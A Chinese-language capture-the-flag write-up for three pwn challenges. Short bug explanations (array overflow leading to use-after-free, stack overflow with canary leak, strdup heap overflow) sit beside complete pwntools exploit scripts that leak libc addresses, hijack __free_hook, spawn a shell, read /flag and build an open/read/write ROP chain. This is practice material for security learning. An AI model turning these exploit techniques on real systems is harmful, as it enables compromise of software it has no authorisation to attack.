## realNoOutPut
main 函数前面有一段被混淆的代码，稍微修复一下，可以得到上图结果。在初始化中，会申请一个 chunk，这个 chunk 用于后续的 check 中。

每当调用 delete、show 和 edit，就会调用这个函数来进行 chunk 地址的比较，这样就使得我们无法修改 got 表项，以及污染 tcache 结构体。按理说，这是一个很不错的防护手段，但是这由于一个 `数组越界漏洞` ，成为了我们的突破口。

在四个功能函数中，我们可以操作的索引范围为 0~10，但是我们注意到，无论是 Size 和 Pointer 的存储数组，都只有 8 个位置。这意味着，我们可以通过 Size_Array 来覆盖 Pointer_Array 的前 2 个，从而实现 UAF 。
```python
#encoding:utf-8
from pwn import *
import re

ip = 'node4.buuoj.cn'
port = 25528
local = 0
filename = './realNoOutput'
PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4

def create_connect():
	global io, elf, libc

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch, timeout=3)
	
	if local:
		io = process(filename)
		if elf.arch == 'amd64':
			libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
		elif elf.arch == 'i386':
			libc_name = '/lib/i386-linux-gnu/libc.so.6'
	else:
		io = remote(ip, port)
		libc_name = 'libc.so.6'

	try:
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
	patterns = [
		re.compile(r'(flag{.*?})'),
		re.compile(r'xnuca{(.*?)}'),
		re.compile(r'DASCTF{(.*?)}'),
		re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
	]

	for pattern in patterns:
		res = pattern.findall(data)
		if len(res) > 0:
			return str(res[0])

	return None

def add(idx, content, size = 0x1):
	sl(b'1')
	sl(str(idx).encode())
	sl(str(size).encode() if size >= len(content) else str(len(content)).encode())
	s(content)

def delete(idx):
	sl(b'2')
	sl(str(idx).encode())

def edit(idx, content):
	sl(b'3')
	sl(str(idx).encode())
	s(content)

def show(idx):
	sl(b'4')
	sl(str(idx).encode())
	return rl()

def pwn():
	cc()
	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	for i in range(7):
		add(i+1, b'A'*0x80)

	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	add(0, b'A'*0x80)
	#add(9, b'A'*0x80)

	for i in range(7):
		delete(i+1)
	add(1, b'A'*0x20)
	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	show(0)
	delete(0)
	add(8, b'A'*0x100)
	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	main_arena = u64(show(0).ljust(0x8, b'\x00')) - 224
	log.success('main_arena: 0x%x', main_arena)
	libc.address = main_arena - 0x1EBB80
	log.success('libc_addr: 0x%x', libc.address)

	delete(1)
	delete(8)

	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	add(0, b'A'*0x80)
	show(0)
	delete(0)
	add(8, b'A'*0x100)
	heap_addr = u64(show(0).ljust(0x8, b'\x00')) - 0x5a0
	log.success('heap_addr: 0x%x', heap_addr)
	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	delete(8)

	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	add(0, b'A'*0x20)
	add(1, b'A'*0x20)
	edit(0, b'A'*0x20)
	delete(0)
	delete(1)
	add(8, b'A'*0x100)
	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	edit(0, p64(libc.sym['__free_hook']))
	delete(8)

	add(0, b'A'*0x20)
	add(1, p64(libc.sym['system']).ljust(0x20, b'\x00'))

	poc = b'/bin/sh\x00'

	add(8, poc, 0x100)
	#g('b *$rebase(0x13AC)\nb *$rebase(0x1561)\nb *$rebase(0x16B1)\nb *$rebase(0x17C0)\n')
	delete(8)

	it()
	cl()

if __name__ == '__main__':
	pwn()
```

## old_thing
我们输入的内容存在栈溢出，而且题目提供了 %s 输出功能，可以通过这个方法来泄露 canary。
不过，在进入功能之前，需要进行登录，这里使用到 \x00 来截断字符串，从而爆破出前面1~2位密码，然后截断比较。
```python
#encoding:utf-8
from pwn import *
import re
from binascii import hexlify

ip = 'node4.buuoj.cn'
port = 25719
local = 0
filename = './canary3'
PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4

def create_connect():
	global io, elf, libc

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch, timeout=3, log_level=1)
	
	if local:
		io = process(filename)
		if elf.arch == 'amd64':
			libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
		elif elf.arch == 'i386':
			libc_name = '/lib/i386-linux-gnu/libc.so.6'
	else:
		io = remote(ip, port)
		libc_name = 'libc.so.6'

	try:
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
	patterns = [
		re.compile(r'(flag{.*?})'),
		re.compile(r'xnuca{(.*?)}'),
		re.compile(r'DASCTF{(.*?)}'),
		re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
	]

	for pattern in patterns:
		res = pattern.findall(data)
		if len(res) > 0:
			return str(res[0])

	return None

def leak():
	sla(b'3.exit\n', b'1')
	return ru(b'Do ')[:-3]

def overflow(content):
	sla(b'3.exit\n', b'2')
	sa(b'your input:\n', content)
	pass

def pwn():
	cc()
	#g('b *$rebase(0x2368)\nb *$rebase(0x24CF)\nb *$rebase(0x249E)\n')
	
	sa(b'please input username: ', b'admin')
	sa(b'please input password: ', b'gB'.ljust(0x20,b'\x00'))
	
	t = u64(leak().ljust(0x8, b'\x00')) 
	elf.address = t - (t % 0x1000) - 0x2000
	log.success('base_addr: 0x%x', elf.address)
	pop_rdi = elf.address + 0x2593
	ret_addr = elf.address + 0x2526
	backdoor = elf.address + 0x239F

	overflow(b'A'*0x19)

	#g('b *$rebase(0x2368)\nb *$rebase(0x24CF)\nb *$rebase(0x249E)\n')
	canary = leak()[0x18:0x18+8].replace(b'A', b'\x00')
	log.success('canary: 0x%s', hexlify(canary).decode())

	#g('b *$rebase(0x2368)\nb *$rebase(0x24CF)\nb *$rebase(0x249E)\n')
	overflow(b'A'*0x38)
	stack_addr = u64(leak()[0x38:0x38+8].ljust(0x8, b'\x00')) - 0x48 - 0xd0
	log.success('stack_addr: 0x%x', stack_addr)

	poc = b''
	poc += b'A'*0x18
	poc += canary
	poc += b'A'*0x8
	poc += p64(backdoor)*2

	#g('b *$rebase(0x2368)\nb *$rebase(0x24CF)\nb *$rebase(0x249E)\n')
	overflow(poc)
	#g('b *$rebase(0x2368)\nb *$rebase(0x24CF)\nb *$rebase(0x249E)\nb *$rebase(0x2525)')
	sla(b'3.exit\n', b'3')
	sl(b'cat /flag')
	ru(b'}')
	cl()

if __name__ == '__main__':
	pwn()
```

## EasyHeap
题目保护全开，而且开启了 seccomp，禁止调用 execve。
add 函数存在漏洞，虽然题目会记录我们输入的 size，但是 malloc 的大小确实由我们输入的字符串决定的，因为其调用了 strdup 函数。这意味着，如果我们输入的 content 长短小于 size，就可以实现堆溢出。
虽然使用 strdup 会由于 \x00 结束符而被截断，但是我们看 edit 函数是调用了 read 函数来读取内容。显然，这里就是堆溢出的点，我们可以利用这个输入带 \x00 的内容，并且可以输入比 chunk 更大的内容。

```python
#encoding:utf-8
from pwn import *
import re

ip = 'node4.buuoj.cn'
port = 25537
local = 0
filename = './Easyheap'
PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4

def create_connect():
	global io, elf, libc

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch, timeout=3, log_level=1)
	
	if local:
		io = process(filename)
		if elf.arch == 'amd64':
			libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
		elif elf.arch == 'i386':
			libc_name = '/lib/i386-linux-gnu/libc.so.6'
	else:
		io = remote(ip, port)
		libc_name = 'libc.so.6'

	try:
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
	patterns = [
		re.compile(r'(flag{.*?})'),
		re.compile(r'xnuca{(.*?)}'),
		re.compile(r'DASCTF{(.*?)}'),
		re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
	]

	for pattern in patterns:
		res = pattern.findall(data)
		if len(res) > 0:
			return str(res[0])

	return None

def add(content, size = 0x1):
	sla(b'>> :\n', b'1')
	sla(b'Size: \n', str(size if size >= len(content) else len(content)).encode())
	sa(b'Content: \n', content.encode() if isinstance(content, str) else content)

def edit(idx, content):
	sla(b'>> :\n', b'4')
	sla(b'Index:\n', str(idx).encode())
	sa(b'Content:', content.encode() if isinstance(content, str) else content)

def show(idx):
	sla(b'>> :\n', b'3')
	sla(b'Index:\n', str(idx).encode())
	ru(b'Content: ')
	return ru(b'1.add').rstrip(b'1.add')

def delete(idx):
	sla(b'>> :\n', b'2')
	sla(b'Index:\n', str(idx).encode())

def mchunk_size(size):
	return p64(0) + p64(size)

def pwn():
	cc()
	#g('b *$rebase(0xD20)\nb *$rebase(0xE16)\nb *$rebase(0xE76)\nb *$rebase(0xF4F)\n')
	for i in range(7):
		add(b'A'*0x90)
	
	add(b'A'*0x90, 0x200) # 7
	add(b'B'*0x90) # 8
	add(b'C'*0x90) # 9

	for i in range(7):
		delete(i)

	#g('b *$rebase(0xD20)\nb *$rebase(0xE16)\nb *$rebase(0xE76)\nb *$rebase(0xF4F)\n')
	delete(8)
	edit(7, b'A'*0xa0)
	
	main_arena = u64(show(7)[-6:].ljust(0x8, b'\x00')) - 96
	log.success('main_arena: 0x%x', main_arena)
	libc.address = main_arena - 0x3EBC40
	log.success('libc_addr: 0x%x', libc.address)
	log.success('free_hook: 0x%x', libc.sym['__free_hook'])

	pop_rdi = libc.address + 0x215bf
	pop_rdx_rsi = libc.address + 0x130569
	pop_rax = libc.address + 0x43ae8
	syscall_addr = libc.address + 0xd2745
	filename = libc.bss()
	flag_addr = libc.bss() + 0x200

	one_gadgets = [libc.address+x for x in [0x4f3d5, 0x4f432, 0x10a41c]]

	edit(7, b'A'*0x90 + mchunk_size(0xa1))
	delete(9)

	#g('b *$rebase(0xD20)\nb *$rebase(0xE16)\nb *$rebase(0xE76)\nb *$rebase(0xF4F)\n')
	add(b'A'*0x90, 0x200) # 0
	delete(7)
	edit(0, b'A'*0xa0)
	heap_addr = u64(show(0)[-6:].ljust(0x8, b'\x00')) - 0x580
	log.success('heap_addr: 0x%x', heap_addr)
	edit(0, b'A'*0x90 + mchunk_size(0xa1))
	delete(0)

	add(b'A'*0x40)
	add(b'A'*0x40)
	delete(0)
	delete(1)

	#g('b *$rebase(0xD20)\nb *$rebase(0xE16)\nb *$rebase(0xE76)\nb *$rebase(0xF4F)\n')
	add(b'A'*0x10, 0x200) # 0
	add(b'A'*0x10) # 1
	add(b'A'*0x10) # 2
	delete(2)
	delete(1)
	edit(0, b'A'*0x10+mchunk_size(0x21)+p64(libc.sym['__free_hook']))
	
	poc_addr = heap_addr + 0x7c0

	poc = b''
	poc += b'A' * 0xa0
	poc += p64(poc_addr + 0xa0)
	poc += p64(pop_rdi)
	poc += p64(0)
	poc += p64(pop_rdx_rsi)
	poc += p64(8)
	poc += p64(filename)
	poc += p64(pop_rax)
	poc += p64(constants.SYS_read)
	poc += p64(syscall_addr)

	poc += p64(pop_rdi)
	poc += p64(filename)
	poc += p64(pop_rdx_rsi)
	poc += p64(0)
	poc += p64(0)
	poc += p64(pop_rax)
	poc += p64(constants.SYS_open)
	poc += p64(syscall_addr)

	poc += p64(pop_rdi)
	poc += p64(3)
	poc += p64(pop_rdx_rsi)
	poc += p64(100)
	poc += p64(flag_addr)
	poc += p64(pop_rax)
	poc += p64(constants.SYS_read)
	poc += p64(syscall_addr)

	poc += p64(pop_rdi)
	poc += p64(1)
	poc += p64(pop_rdx_rsi)
	poc += p64(50)
	poc += p64(flag_addr)
	poc += p64(pop_rax)
	poc += p64(constants.SYS_write)
	poc += p64(syscall_addr)

	#g('b *$rebase(0xD20)\nb *$rebase(0xE16)\nb *$rebase(0xE76)\nb *$rebase(0xF4F)\n')
	add(b'A'*0x200) # 1
	edit(1, poc)
	add(b'A'*0x10) # 2
	add(b'A'*0x10) # 3
	edit(3, p64(libc.sym['setcontext']+53)+p64(0))
	#g('b *$rebase(0xD20)\nb *$rebase(0xE16)\nb *$rebase(0xE76)\nb *$rebase(0xF4F)\n')
	delete(1)

	s('/flag')

	it()
	cl()

if __name__ == '__main__':
	pwn()
```
